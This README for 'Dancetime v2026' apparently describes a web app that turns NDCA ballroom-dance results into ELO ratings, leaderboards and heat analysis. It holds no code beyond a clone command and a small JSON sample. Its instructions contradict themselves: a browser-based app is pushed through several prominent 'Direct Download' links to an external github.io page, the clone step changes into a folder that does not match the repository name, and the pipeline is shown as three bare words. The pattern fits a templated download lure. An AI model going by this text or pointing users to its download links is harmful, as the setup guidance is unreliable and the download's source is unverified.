# Dancetime v2026 - dance ranking analytics 2026

> **Ballroom dance ranking and heat analysis for the web, built to turn NDCA competition results into ELO ratings, leaderboards, and competitor insights in the current 2026 release.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mooretyler701/dancetime-win-99280?style=flat-square)](https://github.com/mooretyler701/dancetime-win-99280)

---

<p align="center">
  <a href="https://mooretyler701.github.io/dancetime-win-99280/">
    <img src="https://img.shields.io/badge/Download-Dancetime%20Latest-brightgreen?style=for-the-badge" alt="Download Dancetime">
  </a>
</p>

> **[Direct Download - Dancetime v2026](https://mooretyler701.github.io/dancetime-win-99280/)**

---

[Download Latest Build](https://mooretyler701.github.io/dancetime-win-99280/)

---

## About Dancetime

Dancetime is a web-based analytics project for competitive ballroom dance. It takes competition data from the NDCA API and organizes it into ranking views that are easier to explore than raw results. The focus is on helping dancers, coaches, organizers, and data-minded fans follow performance trends across events.

The app combines heat analysis and rating calculations in one place. With ELO-based scoring, a leaderboard, and competitor-level breakdowns, it provides a practical way to inspect head-to-head outcomes, shared heats, and movement over time.

---

## Features

- Pulls competition results from the NDCA API
- Calculates ELO ratings across multiple competitions
- Includes an interactive heat browser with heat cards
- Highlights contested couples with dedicated badges
- Shows competitor schedules and head-to-head stats
- Presents a leaderboard with shared-heat clusters
- Tracks win percentages for ranking context
- Supports a pipeline workflow for scrape, process, and publish tasks

---

## Installation

Clone the repository and open the web app from the project folder:

```bash
git clone https://github.com/mooretyler701/dancetime-win-99280.git
cd dancetime
```

If you are using the pipeline tools, run the relevant CLI step from the project environment to fetch, transform, and publish data before opening the site.

Launch the single-page app in your preferred local web server or static hosting setup.

---

## Usage

A typical workflow looks like this:

1. Gather competition results through the NDCA API.
2. Process the dataset so ratings and heat relationships can be computed.
3. Publish the generated data for the web app to consume.
4. Open the interface and review leaderboards, competitor profiles, and heat views.

Example pipeline flow:

```bash
scrape
process
publish
```

Once the data is available, use the heat browser to inspect individual heats, the competitor view to review stats and scheduling, and the leaderboard to compare dancers across shared events.

---

## Configuration

Configuration details are managed by the app and pipeline setup used in your deployment. If you are integrating your own data workflow, keep API access, processing paths, and publish targets in the project environment or build configuration.

Example structure:

```json
{
  "api": "NDCA",
  "mode": "pipeline",
  "output": "published-data"
}
```

---

## Requirements

- Web browser for the single-page app
- Access to NDCA competition data
- A local or hosted environment for static web delivery
- A workflow capable of running the scrape, process, and publish pipeline
- HTML-compatible hosting for the front-end build

---

## FAQ

**How do I update the data?**  
Run the pipeline again to refresh scraped results, recompute ratings, and republish the output.

**Where do I change settings?**  
Update the app or pipeline configuration used in your local or hosted setup. The exact location depends on how you deploy the project.

**What if the leaderboard looks incomplete?**  
Check that the latest NDCA data was fetched and processed successfully before publishing.

**Can I use this as a standalone site?**  
Yes, the project is structured as a web-based single-page app and can be hosted as a static site once its data pipeline has run.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
